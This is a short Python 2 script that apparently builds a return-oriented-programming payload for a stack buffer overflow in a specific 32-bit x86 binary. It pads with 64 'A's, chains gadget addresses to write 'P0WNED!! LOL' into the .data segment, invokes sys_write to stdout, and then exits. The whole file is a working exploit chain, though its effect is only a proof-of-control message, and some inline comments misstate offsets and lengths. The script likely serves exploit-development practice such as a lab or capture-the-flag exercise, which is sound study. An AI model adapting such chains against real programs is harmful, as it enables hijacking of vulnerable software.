import struct

data_seg = 0x080e5060

payload = 'A'*64+'B'*8+'C'*4

payload += struct.pack("<I", 0x08049d6c) # pop edx ; ret
payload += struct.pack("<I", data_seg) # .data
# edx -> start of .data
payload += struct.pack("<I", 0x080b001a) # pop eax ; ret
payload += "P0WN"
payload += struct.pack("<I", 0x08049d66) # mov dword ptr [edx], eax ; ret | write "P0WN" in .data+0

payload += struct.pack("<I", 0x08049d6c) # pop edx ; ret
payload += struct.pack("<I", data_seg+0x04) # .data + 4
# edx -> .data+4
payload += struct.pack("<I", 0x080b001a) # pop eax ; ret
payload += "ED!!"
payload += struct.pack("<I", 0x08049d66) # mov dword ptr [edx], eax ; ret | write "ED!!" in .data+4

payload += struct.pack("<I", 0x08049d6c) # pop edx ; ret
payload += struct.pack("<I", data_seg+0x08) # .data + 8
# edx -> .data+4
payload += struct.pack("<I", 0x080b001a) # pop eax ; ret
payload += " LOL"
payload += struct.pack("<I", 0x08049d66) # mov dword ptr [edx], eax ; ret | write "ED!!" in .data+4

payload += struct.pack("<I", 0x08049d6e) # pop ecx ; ret
payload += struct.pack("<I", data_seg) # .data

#SYSCALL : ECX = .data => 'P','0', 'W', 'N' ...

payload += struct.pack("<I", 0x08049d6c) # pop edx ; ret
payload += struct.pack("<I", 12)
# SYSCALL : EDX = 8

payload += struct.pack("<I", 0x0804fd00) # xor eax, eax ; ret
payload += struct.pack("<I", 0x0807fe0e) # inc eax ; ret
payload += struct.pack("<I", 0x0807fe0e) # inc eax ; ret
payload += struct.pack("<I", 0x0807fe0e) # inc eax ; ret
payload += struct.pack("<I", 0x0807fe0e) # inc eax ; ret
#SYSCALL : EAX = 4 (sys_write)
payload += struct.pack("<I", 0x08049022) # pop ebx ; ret
payload += struct.pack("<I", 0x00000001) # ebx => 1
#SYSCALL : EBX = 1 (stdout)
payload += struct.pack("<I", 0x08049d69) #int 0x80

payload += struct.pack("<I", 0x0804fd00) # xor eax, eax ; ret
payload += struct.pack("<I", 0x0807fe0e) # inc eax ; ret

payload += struct.pack("<I", 0x08049022) # pop ebx ; ret
payload += struct.pack("<I", 0xdeadbeef) # ebx => 0xdeadbeef

payload += struct.pack("<I", 0x08049d69) #int 0x80

print(payload)
